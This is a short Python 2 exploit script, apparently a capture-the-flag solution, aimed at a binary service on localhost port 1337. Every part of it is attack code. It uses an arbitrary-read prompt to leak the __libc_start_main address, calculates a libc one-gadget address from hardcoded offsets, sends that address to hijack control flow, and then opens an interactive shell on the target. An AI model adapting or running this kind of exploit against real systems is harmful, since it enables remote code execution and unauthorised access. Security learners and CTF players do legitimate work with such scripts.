#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 1337))
# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

libc_start_main_offset = 0x0000000000600af0
print recvuntil("?\n")
s.send(str(libc_start_main_offset)+"\n")
libc_start_main_remote = recvuntil("\n")[7:]
print "leaked address libc start main", libc_start_main_remote
print recvuntil("?\n")
main = 0x400646
s.send(str(main)+"\n")
print recvuntil("?\n")
magic_gadget = 0x4652C
init_libc_address = 0x1F3D0
libc_start_main_libc_offset = 0x21DD0 
s.send(str(int(libc_start_main_remote,16) - libc_start_main_libc_offset + init_libc_address + magic_gadget - init_libc_address) + "\n")
print recvuntil("?\n")
s.send(str(int(libc_start_main_remote,16) - libc_start_main_libc_offset + init_libc_address +  magic_gadget - init_libc_address) + "\n")
print "[+] INTERACTIVE!"
interactive()
